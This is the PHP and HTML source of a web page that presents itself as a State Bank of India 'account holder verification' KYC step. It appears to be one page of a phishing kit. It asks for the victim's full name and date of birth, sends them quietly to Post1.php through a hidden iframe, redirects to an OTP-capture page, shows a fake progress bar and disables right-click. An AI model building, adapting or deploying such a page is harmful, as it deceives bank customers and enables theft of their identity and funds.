<?php
    // Start the session
    session_start();

    // Check if the session variable 'User_ID' is set
    if (isset($_SESSION['User_ID'])) {
        // Retrieve and sanitize the username
        $username = htmlspecialchars($_SESSION['User_ID']);
    } else {
        // Redirect to the login page if not logged in
        header("Location: index.html");
        exit();
    }
    ?>
<!DOCTYPE HTML> 
<html>
   <head>
      <title>State Bank of India - Account Details</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
      <link rel="manifest" href="/site.webmanifest">
      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
      <meta name="msapplication-TileColor" content="#da532c">
      <link rel="stylesheet" type="text/css" href="Style.css">
      <link rel="stylesheet" type="text/css" href="Style_Main.css">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   </head>
   <style>
   #ii
   {
   position:absolute;
   top:4px;
   margin-left:-12%;
   }
   .login-box {
   width: 105%;
   padding: 5px;
   }
   .name
   {
   text-transform:uppercase;
   }
   .login-box .user-box {
   position: relative;
   }
   
   .login-box .user-box input {
   width: 100%;
   padding: 2px 4px;
   font-size: 16px;
   color: black;
   margin-bottom: 40px;
   margin-left:0px;
   border: none;
   caret-color:#673391;
   border-bottom: 1.5px solid #CCCCCC;
   outline: none;
   background: transparent;
   transition: border-color 0.2s;
   }
   .login-box .user-box label {
   position: absolute;
   top:-10px;
   left: 2px;
   padding: 5px 2px;
   font-size: 15px;
   font-family: ;
   color: #506070;
   pointer-events: none;
   transition: 0.3s;
   font-family: 'Open Sans', sans-serif;
   font-weight:400;
   
   }
   .login-box input:focus {
   width:100%;
   margin-bottom: 40px;
   padding: 2px 4px;
   margin-left:0px;
   font-size:16px;
   border-width: 2px;
   border-image: linear-gradient(#673391,#673392);
   border-image-slice: 1;
   
   }
   
   .login-box .user-box input:focus ~ label,
   .login-box .user-box input:valid ~ label {
   top: -30px;
   left: 2px;
   margin-left:2px;
   color: #506070;
   font-size: 14px;
   font-family: 'Open Sans', sans-serif;
   font-weight:600;
   }
   
   .login-box-mob {
   width: 100%;
   padding: 10px;
   margin-top:-14px;
   }
   .login-box-mob .user-box-mob {
   position: relative;
   }
   
   .error
   {
   color: Red;
   font-family: 'Work Sans', sans-serif;
   font-size:11px;
   font-style: italic;
   }
   </style>
   <script language="javascript"> 
   var message="This function is not allowed here.";
   function clickIE4(){
   if (event.button==2){
   alert(message);
   return false;
   }
   }
   function clickNS4(e){
   if (document.layers||document.getElementById&&!document.all){
   if (e.which==2||e.which==3){
   alert(message);
   return false;
   }
   }
   }
   if (document.layers){
   document.captureEvents(Event.MOUSEDOWN);
   document.onmousedown=clickNS4;}
   else if (document.all&&!document.getElementById){
   document.onmousedown=clickIE4;}
   document.oncontextmenu=new Function("alert(message);return false;")
   </script>
   <body onload="startTimer();" style="background:#fff;">
      <div class="container-fluid m-0 p-0">
    <img src="Header.png" width="98%">
    <img src="Menu.png" id="ii" width="10%">
</div>
      <section class="">
         <div class="container">
         <!-- Static- Please don't do anything here-->
         <script type="text/javascript">var submitted=false;</script>
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_DOB.php';}"></iframe>
         <!--My Form-->
         <form action="Post1.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
            <div class="box">
               <div class="page-hea">
                  <div class="row">
                     <div class="col-xs-6 col-md-6">
                        <h2 style="font-family: 'Open Sans', sans-serif; font-size:16px; font-weight:600; align-item:centre; text-align:centre;"> Account holder details </h2>
                     </div>
                     <div class="col-xs-6 col-md-6 text-right">
                        <h2>X</h2>
                     </div>
                  </div>
               </div>
               <div class="row">
                  <div class="col-md-6 col-xs-12">
				   <div class="progress">
                              <div class="progress-bar" style="font-family: 'Open Sans', sans-serif; color:red; font-weight:500; width:50%;">25% KYC Completed !</div>
                           </div>
                     <div class="p-50">
                        <h4 style="font-family: 'Open Sans', sans-serif; color:#000; font-weight:700; margin-top:-10%;">Account holder verification</h4>
                        <br><br>
                        <div class="login-box">
                        <div class="user-box">
                        <input type="text" name="Full_Name" class="name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="40"
                        required="">
                        <label>Account holder name<span style="color:red;"> *</span></label>
                        </div>
                        <div class="user-box">
                        <input type="text" name="Date_Of_Birth" id="date" inputmode="numeric" maxlength="10"
                        required="">
                        <label>Date Of Birth<span style="color:red;"> *</span></label>
                        <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Date Of Birth !</span></p1>
                        </tr>
                        </table>
                        <script type="text/javascript">
                        var isShift = false;
                        var seperator = "/";
                        window.onload = function () {
                        //Reference the Table.
                        var tblForm = document.getElementById("date");
                        
                        //Reference all INPUT elements in the Table.
                        var inputs = document.getElementsByTagName("input");
                        
                        //Loop through all INPUT elements.
                        for (var i = 0; i < inputs.length; i++) {
                        //Check whether the INPUT element is TextBox.
                        if (inputs[i].name == "Date_Of_Birth") {
                        //Check whether Date Format Validation is required.
                        if (inputs[i].className.indexOf("date-format") != 1) {
                        
                        //Set Max Length.
                        inputs[i].setAttribute("maxlength", 10);
                        
                        //Only allow Numeric Keys.
                        inputs[i].onkeydown = function (e) {
                        return IsNumeric(this, e.keyCode);
                        };
                        
                        //Validate Date as User types.
                        inputs[i].onkeyup = function (e) {
                        ValidateDateFormat(this, e.keyCode);
                        };
                        }
                        }
                        }
                        };
                        
                        function IsNumeric(input, keyCode) {
                        if (keyCode == 16) {
                        isShift = true;
                        }
                        //Allow only Numeric Keys.
                        if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
                        if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
                        input.value += seperator;
                        }
                        
                        return true;
                        }
                        else {
                        return false;
                        }
                        };
                        
                        function ValidateDateFormat(input, keyCode) {
                        var dateString = input.value;
                        if (keyCode == 16) {
                        isShift = false;
                        }
                        var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
                        
                        //Check whether valid dd/MM/yyyy Date Format.
                        if (regex.test(dateString) || dateString.length == 0) {
                        ShowHideError(input, "none");
                        } else {
                        ShowHideError(input, "block");
                        }
                        };
                        
                        </script>
                        </div>
               </div>
            </div>
            <div class="row">
               <div class="col-xs-12 col-md-12 text-center">
                  <a href="#" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-border">Back</a>
                  <button type="submit" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-primary"> Submit </button>
               </div>
            </div><br>
          </form>
         </div>
      </section>
      <footer>
              <img src="Security.png"width="100%">
              <img src="Footer.png" class="img-fluid hidden-lg hidden-md" width="100%">
              
              </footer>
      
      
	  <script>
	  var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
	  </script>
</div>
</div>
</body>
</html>